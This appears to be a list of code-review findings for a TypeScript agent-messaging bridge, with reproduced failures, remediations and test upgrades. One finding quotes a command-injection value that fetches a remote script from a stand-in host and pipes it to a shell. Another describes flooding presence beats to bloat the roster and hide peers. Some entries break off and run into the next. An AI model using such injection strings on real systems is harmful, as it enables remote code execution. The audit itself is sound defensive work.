summary: buildMessage — the single sanctioned way every plugin assembles a Message — validates nothing, so it happily mints a Message whose dedup key is the empty string and whose timestamp is not ISO 8601, silently violating the two contracts seam.ts declares at the top of the file.
failure: buildMessage({topic: asTopic('t'), sender: '', content: 'x', timestamp: 'now', id: ''}) returns {"senderHandle":"","timestamp":"now","backendMsgId":"","cursor":"",...} with no error (reproduced). Two such messages collide in SeenSet (engine/seen-set.ts keys on backendMsgId), so the second is dropped as already-seen on the push path; the empty cursor is then persisted to read-state and replayed as `since`. seam.ts:8 demands a "STABLE, UNIQUE backendMsgId" and message.ts:47 demands ISO 8601 — the helper that exists to centralise those semantics enforces neither. Mutating `input.cursor ?? input.id` to `input.cursor || input.id` (a real semantic change for a falsy cursor) left all 1600 tests green, so nothing pins the nullish-vs-falsy boundary either.
remediation: Fail fast in buildMessage: throw on an empty `id`, an empty `sender`, an empty explicit `cursor`, and a `timestamp` that is not a parseable ISO 8601 instant. It is the one funnel every plugin passes through, so one guard there covers ten backends and turns a silent dropped-message into a load-time/first-post error.
testUpgrade: Parameterize a table over the CLASS "degenerate field crossing the seam": for each field of BuildMessageInput × each degenerate value ({'', ' ', '\n', undefined-cast, 'now', '2026-13-45'}) assert buildMessage either rejects or produces a value satisfying the field's stated contract — driven by a walk over the input keys so a field added later is graded the moment it appears (the same fixture-walk style config.test.ts already uses for string/numeric leaves). Existing message.test.ts only feeds three well-formed inputs and cannot fail on any of them.

summary: The `MAX_MATCH_INPUT` clamp in Allowlist.has is documented as inclusive ("at most 64 characters" in its own error text and in README.md:276) but the equality case is untested: flipping `>` to `>=` keeps the entire suite green, so a one-character regression in the security-relevant allowlist clamp ships silently.
failure: Mutation `if (topic.length > MAX_MATCH_INPUT)` → `>=` in allowlist.ts:94: 1600/1601 tests still pass (the only failure was the unrelated keycloak e2e, which needs a container). Under the mutation, allow.assert('ctx-' + 'a'.repeat(60)) — exactly 64 chars, matched by post_topics `ctx-.*` — throws TopicNotAllowedError with the self-contradictory message "patterns are only matched against topics of at most 64 characters (this one is 64)", and every operator with a 64-char topic loses post/fetch. The existing test only samples 63 (true) and 84 (false); the SAFE × LENGTHS table includes 64 but every topic in it ends in '!' so it can never match and cannot discriminate.
remediation: No production change needed to has(); pin the boundary. Assert both sides at the constant: a matching topic of exactly MAX_MATCH_INPUT chars is allowed, and one of MAX_MATCH_INPUT+1 is refused, both derived from the exported constant rather than a literal 64.
testUpgrade: One parameterized helper for the CLASS "documented inclusive bound": table of (bound constant, predicate, expected-at-bound-1/bound/bound+1) rows covering MAX_MATCH_INPUT (allowlist), MAX_GLOB_LEN (identity-filter), MIN_HASH_LEN/HASH_HEX_LEN (topic-name, already done) and presence.ttl_ms >= heartbeat_ms (config), so every off-by-one in a stated bound reddens. Widen the SAFE × LENGTHS table to use a topic that DOES match the pattern at each length, otherwise the length axis grades only the clamp.

summary: The presence ttl/heartbeat cross-field rule is documented as `>=` (its own message, README.md "Must be ≥ the heartbeat") but ttl_ms === heartbeat_ms is never exercised, so mutating `<` to `<=` keeps the suite green while rejecting a legal config with a message that contradicts itself.
failure: Mutation `cfg.presence.ttl_ms < cfg.presence.heartbeat_ms` → `<=`: 1600/1601 tests still pass. Under the mutation, parseConfig({identity:{handle:'h'},topics:['a'],presence:{heartbeat_ms:1000,ttl_ms:1000}}) throws "presence.ttl_ms must be >= presence.heartbeat_ms" for a value that IS >=. The existing test samples ttl 5 (reject) and 500000 vs 60000 (accept) and the 3× default; nothing sits on the boundary.
remediation: Add the equality row: heartbeat_ms === ttl_ms must parse. (Same class as the allowlist clamp above — fix both with one shared boundary table.)
testUpgrade: Table-drive every cross-field numeric rule in the schema as (below, at, above) triples derived from the rule's own operands, and generate the rows from the fixture walk that config.test.ts already uses, so a rule added later is graded at its boundary rather than at one sampled interior value.

summary: The seam's own contract text tells plugin authors that the SQLite reference backend answers a never-posted topic with `nextCursor: '0'`. It does not — it mints `<storeId>.0` — so the one concrete example a new plugin author copies is wrong.
failure: seam.ts:118 claims `{ messages: [], nextCursor: '0' }`. packages/bridge-sqlite/src/index.ts:232 returns `mintCursor(storeId, resumeAfter ?? 0n)` and mintCursor (line 522) returns `${storeId}.${rowid}`, i.e. `a1b2c3d4.0`. A plugin author who mirrors the documented `'0'` produces a cursor with no store identity, which is exactly the shape bridge-sqlite's resumeAfter rejects as "minted by a different backend".
remediation: Either drop the parenthetical or state it as the shape it is ("a store-scoped cursor at position zero"). Concrete cursor literals in the seam doc rot the moment a backend changes its encoding; the contract is "replayable", not "'0'".
testUpgrade: Guard the CLASS "seam doc cites a backend-specific literal": a doc test that extracts every backtick-quoted cursor/id literal from packages/bridge-core/src/seam.ts and asserts each one is produced by at least one plugin's conformance run (or that the file contains none at all). Cheaper variant: forbid concrete cursor literals in seam.ts entirely, mirroring source-hygiene.test.ts's grep-style class guards.

summary: "Core never compares cursor values" (repeated as "never parses, compares, or sorts by cursor value" in message.ts:24) is false: core's catch-up pager compares cursors for equality, and that comparison decides whether paging stops. A plugin author is told cursor equality is meaningless to core when core's termination depends on it.
failure: engine/catchup.ts:71: `if (messages.length === 0 || nextCursor === since) return total;`. A plugin that legitimately returns the same nextCursor while more history remains (or one that returns a fresh, non-equal-but-equivalent token per call, e.g. a Matrix pagination end token) gets different core paging behaviour than the doc promises. The intended invariant is that core never ORDERS by cursor, and the absolute phrasing hides a real obligation: nextCursor must be stable for a given position.
remediation: Say what is actually guaranteed: core never parses, orders or sorts by cursor value; it compares only for equality, to detect a page that made no progress — therefore nextCursor MUST be stable for a given position. Same edit in message.ts's Cursor doc.
testUpgrade: Add a conformance row for the CLASS "cursor stability" that the doc obligation implies: fetch the same position twice via two independent calls and assert nextCursor is byte-identical, and add a nonconformant fixture (packages/bridge-core/src/testing/nonconformant.ts) whose nextCursor is freshly minted each call, asserting the suite reddens — so the equality dependency is graded rather than described.

summary: The core package README — which ships to npm — states the allowlist rule as "All three go through the topic Allowlist — any topic outside `config.topics` throws TopicNotAllowedError". That is exactly what post_topics defeats, the tool table is missing a whole tool, and the fetch_recent signature omits block_ms.
failure: README.md:84 claims post/reply/fetch_recent are confined to config.topics. allowlist.ts:has() returns true for any topic matched by a post_topics pattern, so with post_topics: ['.*'] every non-reserved topic is postable — a reader auditing their exposure from this README concludes the opposite. Separately: registerTools registers FOUR tools (tools.ts:177/246/268/293) but the table lists three and says "All three", omitting parley_list_users (which exposes the peer roster); and the parley_fetch_recent row is `{ topic, since?, limit? }`, omitting the `block_ms` long-poll parameter the schema accepts at tools.ts:202.
remediation: Restate the rule in both dimensions (explicit `topics` for subscribe/catch-up; explicit + anchored post_topics, minus the reserved presence topic, for post/fetch), add the parley_list_users row, and add block_ms to the fetch_recent signature.
testUpgrade: Guard the CLASS "README tool table drifts from registerTools": a test that registers the tools against a recording McpServer stub and asserts the set of tool names and the top-level keys of each inputSchema are exactly those appearing in packages/bridge-core/README.md's table — so adding or renaming a tool or a parameter fails until the shipped doc is updated.

summary: filterHandles special-cases only `undefined`, so an empty-string filter means "match nothing" — and the parley_list_users schema accepts '' (only `.max`, no `.min(1)`) while its description says "Omit for all". A client that serialises an unset filter as "" gets an empty roster and no error.
failure: filterHandles([{handle: 'claude-a'}], '') === [] and matchGlob('', 'claude-a') === false (reproduced). parley_list_users({ filter: "" }) therefore returns { users: [] } — indistinguishable from "nobody is reachable" — for a caller that meant "no filter". The identity-filter tests only ever pass `undefined` or a non-empty glob, so nothing grades ''.
remediation: Pick one and fail fast: either `.min(1)` on the filter schema so '' is a validation error, or treat '' as "no filter" in filterHandles. Do not leave the third behaviour (silently empty result) — an empty roster is the one answer a caller cannot distinguish from a real outage.
testUpgrade: Parameterize the CLASS "empty-string vs omitted optional" across every optional string the tool surface accepts (filter, topic, since, in_reply_to): for each, assert '' either throws a validation error or behaves identically to omitting it — never a third, silently-narrowing behaviour. That table also catches the next optional string added to the schema.

summary: assertNoBackendKey interpolates the raw `backend:` value into a backticked shell command the operator is told to run, with no validation that it names a real backend or even a plausible token.
failure: parseConfig({ backend: 'sqlite && curl evil.sh | sh', identity:{handle:'h'}, topics:['a'] }) throws (reproduced verbatim): "… run `parley-sqlite && curl evil.sh | sh` (each backend package ships its own bin)." A config file is not always operator-authored end to end (generated, templated, or checked in by someone else), and the error is deliberately shaped as copy-paste-and-run. The same path also invites `parley-<anything>`, i.e. installing a package that may not be ours.
remediation: Only build the `parley-<name>` suggestion when the stripped value matches a conservative token (/^[a-z][a-z0-9-]{0,31}$/) AND names a backend this repo ships; otherwise print the generic list. Never interpolate an unvalidated config value into text formatted as a command.
testUpgrade: Table over the CLASS "config value reaches an error message": rows for shell metacharacters, newlines, ANSI escapes, 10KB strings and non-string types, asserting the thrown message contains no `parley-<value>` suggestion unless the value matches the safe-token pattern — and, generically, that no error message emitted by parseConfig contains a raw control byte or a shell metacharacter drawn from input.

summary: The hostile-regex corpus is restated in three files with three different memberships, so the class each layer is supposed to reject depends on which copy the maintainer happened to edit.
failure: regex-safety.test.ts HOSTILE has 12 rows; allowlist.test.ts HOSTILE has 7 (the same five plus two chain shapes); config.test.ts:63 has 5 — it omits the ambiguous-alternation-chain and optional-atom-chain rows that regex-safety.test.ts's own header calls "the class this guards … which no quantifier-counting screen can see". So the config load path, the one an operator actually hits, is never graded against the two shapes the screen exists for. A maintainer widening the class (a new chain shape) has to find and edit three near-copies and will silently miss one.
remediation: Export one HOSTILE/SAFE corpus (e.g. from src/testing/) and drive all three suites from it, so every layer that compiles an untrusted source is graded against the same, single list — and a row added once is enforced everywhere.
testUpgrade: After sharing the corpus, add a meta-assertion that each of the three screening entry points (isRedosSafeSource, new Allowlist({postPatterns}), parseConfig({post_topics})) rejects EVERY row of the shared HOSTILE list and accepts every row of SAFE — one it.each over (entry point × row) instead of three hand-maintained tables.

summary: isRedosSafeSource's doc asserts "everything the screen accepts also compiles on its own". It does not: a leading quantifier or an out-of-order brace passes the screen and fails to compile — and the test written to guard that very sentence cannot reach either shape.
failure: isRedosSafeSource returns true for '*a', '+a', '?a', 'a**', '{2}', 'a{3,2}', 'a{2,1}', 'x{5,3}y', and new RegExp() throws SyntaxError for all eight (reproduced). The guard test 'never accepts a source that does not compile on its own' draws candidates only from CORPUS + one/two-char truncations + class prefixes, none of which ever starts with a bare quantifier or reverses a brace range. Impact is contained today only because both real callers compile first (allowlist.ts:83 assertCompilesAlone, engine/presence.ts:299 try/catch) — but the false claim is exactly the argument a future reader would use to delete assertCompilesAlone as redundant.
remediation: Weaken the sentence to what holds ("a source the scan cannot follow is refused") and stop implying compilability, or make it true by rejecting a quantifier with no preceding atom and a brace whose min > max.
testUpgrade: Replace the fixed candidate list with a generator for the CLASS "accepted-but-uncompilable": enumerate short sources over a metacharacter alphabet ('a','.','*','+','?','|','(',')','[',']','{','}',',','1','2','\\'), and assert no source the screen accepts fails new RegExp. The same generator also re-grades the screen's fail-closed behaviour on every truncation shape without anyone naming it.

summary: safeName's doc describes its `sanitize` parameter as "the backend's legal-charset fold (unchanged from today)" — a comment about when the code was written, which rots the first time a plugin changes its fold and tells a future developer nothing about the risk.
failure: Reading topic-name.ts:27 in six months, "unchanged from today" resolves to no date and no baseline; a plugin that has since tightened its fold makes the sentence actively false while the code stays correct. CLAUDE.md is explicit that this belongs in the commit message, and that a comment earns its place only as "keep X, so that Y".
remediation: Delete the parenthetical. The load-bearing risk statement is already there two paragraphs down (the fold must be total and non-truncating or safeName throws); keep that, drop the history.
testUpgrade: Extend source-hygiene.test.ts, which already greps the CLASS "comment narrates history" for tracker ids, with a second pattern set for temporal self-reference in comments ("as of", "unchanged from today", "previously", "used to", "in round N", "the reviewer") across packages/**/*.ts — one grep guards the class everywhere instead of one deletion guarding this instance.

summary: Every hostile-input cap in presence (MAX_RECORD_TOPICS, MAX_TOPIC_LEN) is PER BEAT, but computeRoster unions topics/postTopics across all live instances of one handle and nothing caps the number of instances. One writer multiplies the caps by the presence page size.
failure: Reproduced in this worktree: 500 beats, same `handle: 'attacker'`, each with a distinct `instanceId` and 64 topics + 64 postTopics of exactly MAX_TOPIC_LEN (512 chars, all distinct) -> computeRoster returns ONE entry with 32,000 topics and 32,000 postTopics; JSON.stringify(roster) = 32,960,083 bytes (33 MB, which parley_list_users returns verbatim as tool text into the agent's context), computeRoster itself takes 691 ms and filterReachable then compiles 32,000 untrusted regexes and burns 2,072 ms of the single-threaded event loop per call. The docstrings on MAX_RECORD_TOPICS/MAX_TOPIC_LEN state exactly the opposite ("a hostile peer can't bloat the roster or hand us an unbounded pattern list", "can't smuggle multi-megabyte strings into roster memory and parley_list_users output"), so DESIGN §14's claim is false as written.
remediation: Cap the aggregate, not just the record: in computeRoster bound instances retained per handle (e.g. keep the N freshest per handle, N small) AND clamp the unioned topics/postTopics to MAX_RECORD_TOPICS after the union; in filterReachable compile a peer's patterns at most MAX_RECORD_TOPICS times (and memoize the compile across roster entries). The union is the place the cap has to be re-applied because that is where per-record bounds stop composing.
testUpgrade: Parameterize a hostile-beat generator over the axes that multiply: (instances per handle) x (entries per record) x (string length), e.g. it.each([[1,64],[8,64],[500,64],[500,1]]) asserting a single hard budget on the OUTPUT (JSON.stringify(roster).length <= a fixed byte ceiling, roster[i].topics.length <= MAX_RECORD_TOPICS) and a wall-clock bound on filterReachable. The existing 'unions topics/postTopics across an online handle live instances' case uses two instances and can never fail on aggregate bloat; widen it into that table so any future field added to PresenceRecord inherits the budget.

summary: parley_list_users reconstructs the whole roster from ONE fixed page of the presence topic (PRESENCE_FETCH_LIMIT = 500 most-recent beats). Any single emitter that beats faster than the rest of the fleet evicts every other peer from the page, so hand-off discovery returns only the flooder.
failure: Same reproduction as above: 500 beats from one handle in the page -> computeRoster returns exactly 1 roster entry. Any genuine peer whose last beat is older than those 500 messages is simply absent from parley_list_users; the only signal to the agent is `truncated: true`, and the tool offers no `since`/pagination for the caller to recover the missing peers. A misconfigured peer (presence.heartbeat_ms = 1, which config accepts as a positive int and presence-loop clamps to a 1 ms interval) reaches this accidentally, not just maliciously.
remediation: Page the presence read (loop fetchRecent with `since` until the TTL/`since_ms` window is covered, bounded by a page ceiling), or make the presence scan window-driven rather than count-driven, and keep a per-handle beat quota while folding the page so one emitter cannot consume all slots. Failing that, say in the tool description that a noisy emitter can hide peers, rather than only that 'older offline peers may be missing'.
testUpgrade: Table the presence page over occupancy shapes: [one flooder + one quiet real peer], [N handles evenly beating], [flooder with mixed kinds], asserting the quiet real peer is still in the roster in every row. Guards the class 'roster completeness under an adversarial/noisy share of the presence stream' rather than the 500-beat instance.

summary: ReadStateStore.flush merges disk UNDER its whole in-memory map (`{...load(), ...this.state}`), so any flush rewrites every topic this instance has ever set. Two stores on one path (the documented default: instance_id defaults to the handle) therefore regress each other's cursors persistently, not just on a race.
failure: Reproduced: A and B on one file. A.set('t1','10'); B.set('t1','20'); A.set('t2','5') -> disk = { t1: '10', t2: '5' }. B's advance to 20 is rolled BACK by a flush that touched an unrelated topic, and because A keeps t1='10' in memory it re-clobbers it on every subsequent flush forever. After a restart B resumes catch-up from '10', re-drains messages 11..20 with a cold SeenSet, and re-emits them as <channel> events — the exact duplicate-delivery the cursor/dedup contract exists to prevent. The class docstring asserts the opposite bound: "the worst case is a single topic's cursor losing a race — not a whole session's read position".
remediation: Flush a DELTA: track the topics mutated since the last flush and write `{...load(), ...delta}`, then adopt the merged value into `this.state` so this instance stops carrying stale positions for topics it is not driving. Core cannot compare opaque cursors, so last-writer-wins per touched topic is the strongest correct rule — and it makes the docstring's claimed worst case true. Fix the comment in the same change.
testUpgrade: Add a topics dimension to the existing 'two stores on one path never erase each other' table: today every row writes DISJOINT topics (ctx vs ops), which is why it passes. Parameterize over [disjoint, shared, shared+unrelated-third-topic] x [sequential, interleaved, reversed] and assert on reopen that no topic ever holds a value older than the last value written to it by any store. Widen it to assert monotonicity of the whole map, not just two known keys.

summary: RemoteHttpServer.close() awaits Node's server.close(), which waits for in-flight requests. A parley_fetch_recent long-poll (up to catchup.block_max_ms, default 60 s) holds the connection, so teardown hangs for the whole remaining budget — while the presence goodbye has already been posted, so the bridge is advertised as gone but still serving.
failure: Reproduced: app with block_max_ms 8000/block_poll_interval_ms 200, client calls parley_fetch_recent{topic:'ctx', block_ms:8000} on an empty topic, then 300 ms later remote.close() -> close took 10,719 ms (test asserted <1000). With the default 60 s cap this exceeds a `docker stop` grace period (10 s) and systemd's default TimeoutStopSec behaviour, so the process is SIGKILLed mid-teardown; nothing else in the repo force-closes sockets (no closeAllConnections/closeIdleConnections anywhere).
remediation: Bound close() the way the goodbye already is: after s.close(), call s.closeIdleConnections() and, after a short grace window, s.closeAllConnections() (or track live transports and close them) so in-flight long-polls are aborted — the tool layer already maps an aborted long-poll (FetchAbortedError) to an empty result, so cancellation is safe.
testUpgrade: Extend the existing 'remote HTTP close() is bounded whatever the presence post does' table with a second dimension for in-flight work: [no request], [a long-poll fetch_recent in flight], [an idle keep-alive connection], [a client that opened a socket and sent nothing], asserting close() settles inside one fixed budget in every cell. The current table varies only presence-post behaviour and cannot fail on request-driven hangs. Mirror it for ParleyBridge.shutdown().

summary: The comment says the ChannelMetaKey union exists 'so that a hyphenated key (`msg-id`) is a compile error'. TypeScript places no identifier constraint on string-literal types, so the stated guarantee does not exist; the real guard is a runtime regex in channel-emit.test.ts.
failure: Mutated the union to `'topic' | 'sender' | 'cursor' | 'msg-id' | 'mentions'` and the call to put('msg-id', m.backendMsgId), then ran `npx tsc -p tsconfig.json --noEmit`: zero errors. A future developer adding a `read-state` or `in-reply-to` meta key gets the silent-drop bug the comment promises to prevent, with no compile error — they are relying on a guarantee the type system never made.
remediation: Delete the false rationale and keep the risk phrased against the guard that actually holds ('keep every meta key an identifier, so that Claude Code does not silently drop the attribute — pinned by the key-shape assertion in channel-emit.test.ts'), or make the claim true by branding the key type through a template-literal-validated helper.
testUpgrade: The identifier assertion already exists per-field; make it structural so it cannot be bypassed by a new emit site: assert in one place that every key of channelMeta for a generated Message (fuzzed over hostile topic/sender/cursor/msg_id/mentions values, which the file already tables) matches /^[A-Za-z_][A-Za-z0-9_]*$/ AND that the key set equals a hard-coded literal list — and add a case that a Message field carrying a hyphen never produces a hyphenated KEY.

summary: index.ts exports `fetchRecentBlocking` and `BlockingFetchOptions` but NOT `FetchAbortedError`, and package.json `exports` allows only '.', so no consumer of the published package can catch the documented cancellation type.
failure: `import { fetchRecentBlocking } from '@sharptrick/parley-core'` then `catch (e) { if (e instanceof FetchAbortedError) ... }` is unwritable: the symbol is not exported and the deep path './dist/engine/blocking-fetch.js' is not in the exports map (ERR_PACKAGE_PATH_NOT_EXPORTED). The error's own JSDoc says callers must distinguish it from a backend failure, and every other sentinel in this repo ships a by-contract recogniser (isNoSuchTopicError, precisely because instanceof breaks across duplicate installs) — this one has neither.
remediation: Export FetchAbortedError from index.ts and add an `isFetchAbortedError(err)` contract predicate mirroring no-such-topic.ts, then use it at the tools.ts catch site so a duplicate-install copy is still recognised.
testUpgrade: Generalise the existing absent-topic-sites 'recognised by contract, not by class identity' suite into a table over ALL core sentinel types (NoSuchTopicError, FetchAbortedError, TopicNotAllowedError, UnsafePatternError) x [native instance, foreign twin from a duplicate install], plus a mechanical check that every error class thrown by an index-exported function is itself index-exported (scan src for `throw new X` in exported modules and assert X is in the public surface).

summary: `fetchRecentBlocking` is public API. With pollIntervalMs <= 0 the `if (nap <= 0) return result;` branch silently collapses a long-poll into a single fetch — the opposite of the documented contract — instead of failing fast. The sibling case in presence-loop (heartbeatClamp turning 0 into a 1 ms interval, i.e. a post storm) is the same shape.
failure: fetchRecentBlocking(plugin, {topic}, {blockMs: 60000, pollIntervalMs: 0}) on an empty topic returns immediately after one query with an empty page, having honoured none of the 60 s budget; no error, no warning. Mutation M12 (deleting the `if (nap <= 0) return result;` line entirely) left the whole engine+transport suite green (443 passed), confirming no test reaches this branch in either direction — it is uncovered behaviour on an exported function, protected only by the config schema's `positive()` which does not apply to direct API callers.
remediation: Reject a non-positive pollIntervalMs (and non-positive heartbeatMs) at the function boundary rather than degrading, or clamp to a documented floor and say so in the option's JSDoc. Core's own config already guarantees positive values, so fail-fast costs nothing and removes an untested branch.
testUpgrade: Table the degenerate-argument class across the engine/transport entry points that take a cadence or budget: it.each([['pollIntervalMs', 0], ['pollIntervalMs', -1], ['blockMs', -1], ['heartbeatMs', 0], ['heartbeatMs', -5]]) asserting a throw (or the documented clamp with an observable minimum number of iterations/posts), so a future knob added to BlockingFetchOptions/PresenceLoopOptions inherits the check.

summary: parley_fetch_recent's description states unconditionally 'Returns { messages, nextCursor }', but two handler paths return no nextCursor at all when the caller passed no `since`.
failure: fetch_recent{topic:'absent'} with no `since` on a topic the plugin reports as absent returns `{"messages": [], "topicAbsent": true}` (pinned by tools.test.ts:737) — `nextCursor` is absent because JSON.stringify drops the undefined. Same for a client-cancelled long-poll (line 234). An agent following the description with `since = res.nextCursor` gets undefined and re-issues a since-less read, so once the topic appears it re-reads the whole recent window instead of resuming — duplicate content in the session, driven by the doc.
remediation: Either always return a nextCursor the caller can replay (echo their `since`, and on the no-since path say explicitly that nextCursor is omitted) or amend the description to 'Returns { messages, nextCursor } — nextCursor is omitted when the topic is absent or the call was cancelled and you passed no since; re-issue without since.' Core must not mint a cursor here (DESIGN §6), so the doc is the thing that has to change.
testUpgrade: Table the fetch_recent result SHAPE over [since given, no since] x [normal, topicAbsent, cancelled long-poll] and assert the returned key set matches what the tool description promises, deriving the expected keys from the description string or a single shared constant so the description and the handler cannot drift apart independently.

summary: The clock-skew boundary of decodePresence/computeRoster is covered by five separate hand-written `it` blocks that each rebuild beats and assert one point on the same axis; a reader cannot see which offsets are covered, and neighbouring cases re-pin what earlier ones already pin.
failure: 'a far-future spoofed `at` never enters the roster', 'a far-future spoof cannot outlive a legit peer that ages out', 'decode rejects a beat beyond the skew tolerance but keeps one exactly at it', 'a legitimate small clock skew (at = now + 1s) still reads online', 'the far-future guard leaves the normal past-TTL offline path intact' are five bodies for one parameter: `at - now` in {-2*ttl, -1s, +1s, +MAX_CLOCK_SKEW_MS, +MAX_CLOCK_SKEW_MS+1, +1e15}. Nothing in the set can fail independently of its neighbours except the two boundary points, and the offsets actually covered are invisible without reading all five.
remediation: Merge them into one it.each over [offsetFromNow, expected {decoded, online, listed}] rows covering the six points above; keep the 'immune forever' assertion as one extra row that evaluates the same beat at two different nowMs values. Same treatment applies to the four adjacent decode-truncation cases (over-long instanceId / handle / topics / postTopics), which are one axis of (field, length, expectation).
testUpgrade: The merge IS the upgrade: a single skew table parameterized on the offset (including exactly-at-the-cap and cap+1 derived from MAX_CLOCK_SKEW_MS rather than hard-coded), so raising or lowering the constant moves the boundary rows automatically instead of leaving five stale prose-named cases.

summary: The delegated-OIDC identity gates (allowed_subjects / allowed_usernames) are the only thing preserving the single-tenant posture in oidc mode, and no test discriminates exact equality from a widened match. Mutating both `.includes(x)` calls to a prefix match leaves the whole offline auth suite green (528/528).
failure: Mutation: `allowedSubjects.includes(payload.sub)` -> `allowedSubjects.some(a => payload.sub!.startsWith(a))`, same for allowedUsernames. `npx vitest run packages/bridge-core/src/auth --exclude '**/*.e2e.test.ts'` => 528 passed. summary: `mcpPath` is validated only as a URL path, then handed to `app.post(mcpPath, ...)` where Express 5 / path-to-regexp treats ':', '*', '{', '}', '(', ')' as pattern metacharacters. With `mcpPath: '/:x'` every single-segment path becomes an MCP endpoint. A bare '/mcp*' instead throws an opaque path-to-regexp error at boot.

The operator is pointed at TLS, which cannot help. The set also carries two spellings of IPv6 loopback ('::1' and '[::1]') of which only '[::1]' can ever match, since URL.hostname always brackets it.

summary: `(N & (N - 1)) !== 0` evaluates in int32, so every N congruent to a power of two mod 2^32 passes the power-of-two guard, including values Node's scrypt cannot accept at all. The guard whose stated job is to refuse a degenerate stored record at BUILD time lets it through, and the failure resurfaces as a thrown RangeError on the owner's login path.
failure: `makeOwnerVerifier('scrypt$N=4294967298,r=8,p=1$<16B salt b64>$<32B hash b64>')` returns a verifier instead of throwing (also 4294967296, 8589934594, 6442450944). Calling it rejects with `RangeError: The value of "N" is out of range... Received 4_294_967_298`. Through the front door that is a non-ConsentError out of completeConsent, so every consent POST answers 500 and the owner is locked out with no message naming the bad record. r and p also have no upper bound, so `r=100000` is accepted and then attempts a ~200 GB allocation.
remediation: Use a safe-integer power-of-two test (Number.isSafeInteger(N) && N >= 2 && N <= 2**31 && Math.log2(N) % 1 === 0) and bound r, p and the derived maxmem, so a bad record throws 'invalid owner secret hash' at makeOwnerVerifier.
testUpgrade: Widen the existing 'refuses to build a verifier from %s' table with a generated OUT_OF_RANGE_COSTS group: N in {0,1,3,16383,2**31,2**32,2**32+2,2**33+2,1e21,MAX_SAFE_INTEGER}, r in {0,1e6}, p in {0,1e6}, each asserting a throw. Add one property row: for ANY stored record, makeOwnerVerifier either throws or returns a verifier that RESOLVES (never rejects) — that guards the class 'a build-time validator that defers its failure to the hot path'.

summary: `if (passphrase.length === 0) return false;` in the built verifier is credited by `expect(await verify('')).toBe(false)` in owner.test.ts, but deleting the line keeps that assertion — and the whole auth suite — green, because scrypt('') simply derives a non-matching hash. The test names a guard it does not exercise.

testUpgrade: Add a rule of the form 'every early-return guard in owner.ts must be provable': assert verify('') resolves false WITHOUT invoking scrypt, by spying on node:crypto's scrypt, so removing the short-circuit turns the test red. The class is 'an assertion whose truth is produced by a different code path than the guard it is named for'.

summary: RemoteAuthOptions.trustProxy is forwarded only in the builtin branch; the oidc branch drops it with no error and no warning. The JSDoc says 'builtin mode only', but a caller — including examples/self-host-remote, which reads PARLEY_TRUST_PROXY unconditionally — who sets it under auth.mode: oidc gets a silent no-op on the option documented as what stands between an anonymous flood and the owner's only way in. summary: `connect()` opens the SQLite connection and then does five more things that can throw; on any of them the connection is never closed, and if the throw happens after `this.driver = driver` the instance is left half-connected — every retry answers "already connected" while every operation answers "not connected".
failure: Reproduced twice. (a) `db_path` pointing at an existing non-database file (an operator typo, e.g. notes.txt): `openDriver` succeeds, `driver.exec(SCHEMA)` throws `file is not a database`, and the open connection is dropped on the floor. 50 sequential failed `connect()` calls in one process left 50 open file descriptors on that path (counted via /proc/self/fd) — an unbounded leak for any supervisor that retries connect on a transient store failure. (b) A pre-existing `messages` table without `in_reply_to` (schema drift from an older store): the throw lands at line 152's `prepare`, i.e. after line 148 sets `this.driver`, so: connect#1 -> "table messages has no column named in_reply_to"; connect#2 -> "parley-sqlite: already connected — call disconnect() before connecting again"; post -> "SqlitePlugin not connected"; fetchRecent -> "SqlitePlugin not connected". The instance simultaneously claims to be connected and not connected, and the only escape is a `disconnect()` the caller has no reason to make after a failed connect.
remediation: Make `connect()` all-or-nothing: build the driver, statements and store id into locals inside a try, and on any throw `driver.close()` and leave every field untouched before rethrowing (assign `this.driver`/statements/`storeId` only once all of them succeeded). The `already connected` guard should then only be reachable from a genuinely successful connect.
testUpgrade: Add a parameterized lifecycle table over WHERE inside connect the failure lands — one row per post-open step (`exec(SCHEMA)` via a not-a-database file, each `prepare` via a drifted `messages` table, `readOrMintStoreId` via a stubbed `parley_meta` insert that throws) — asserting for every row: (i) the rejection names parley-sqlite and the real cause, (ii) a second `connect()` with a good db_path succeeds rather than reporting `already connected`, and (iii) no driver handle leaked (count open fds for the path, or spy on `SqlDriver.close`). Widen it with a fault generator that makes the Nth driver call throw, so a step added to `connect()` later is covered without a new row. Existing `test/lifecycle.test.ts` ORDERS table is too narrow: every row starts from a successful connect, so it cannot see a failed one.

summary: Nothing in the suite asserts that retention KEEPS a message inside its window. The cutoff arithmetic — the one line standing between `retention_days: 3650` and wiping the whole shared store — is completely unguarded, so the exact irreversible loss `validateBackendConfig` was hardened against ships green when it arrives through the arithmetic instead of through the config value.
failure: Mutated `retentionCutoff` from `Date.now() - retentionDays * 86_400_000` to `Date.now() + ...` (a plausible sign slip; it also stands in for any future refactor of days->ms). Behaviour: `retention_days: 3650` now deletes every row in the file at connect and hourly thereafter, including messages posted one second ago — the whole conversation history of every session sharing that file, irreversibly, with no diagnostic. Ran the three test files that touch retention (test/background-jobs.test.ts, test/config-validation.test.ts, src/index.test.ts — grep confirms they are the only ones in the repo for this backend): 149 passed, 0 failed. Every existing retention case either seeds rows with a deliberately-old `ts` and asserts they vanish, or only asserts "no `retention prune failed` diagnostic" — both of which a delete-everything prune satisfies.
remediation: Give `retentionCutoff` a direct table-driven test (days -> expected cutoff, asserted against a frozen clock) and add a retention case that posts one message inside the window and one outside and asserts the in-window message survives.
testUpgrade: Parameterize a `retention_days x age-of-row` matrix asserting BOTH arms per row: for days in {1e-8, 0.5, 1, 30, 3650} x rows planted at ages {0 (just posted), 0.5*window, 0.99*window, 1.01*window, 10*window}, assert exactly the rows older than the window are gone and every younger row is still fetchable — after the connect-time prune and after a forced timer prune. Add a unit table on `retentionCutoff` itself (frozen Date.now(), exact ISO string) so the arithmetic has an anchor independent of any store. This guards the class "prune deletes the wrong side of the window", which a sign flip, a unit slip (hours vs days), or a `<` -> `<=` change all fall into. Existing test/config-validation.test.ts 'every accepted retention_days actually prunes' is too narrow — it grades the absence of a diagnostic, not the retained set.

summary: The case titled 'the prune resolves its window through an index, not a table scan' runs EXPLAIN QUERY PLAN on a SQL string the test file wrote itself, not on the plugin's `pruneStmt`. It therefore certifies a copy, and the shipped prune can degrade to a full table scan with the test still green.
failure: Mutated the plugin's prune statement to `DELETE FROM messages WHERE id IN (SELECT id FROM messages WHERE substr(ts,1,40) < ? LIMIT ?)` — a form that cannot use idx_messages_ts and scans the whole table on every prune, holding the file's single write lock for a span that scales with the store (exactly the SQLITE_BUSY-in-a-peer's-post() failure the surrounding describe block says it exists to prevent). Ran the block: both cases pass; the whole 149-test prune-related set passes. The same hole covers dropping the LIMIT subquery, or reordering the predicate so the index is unusable.
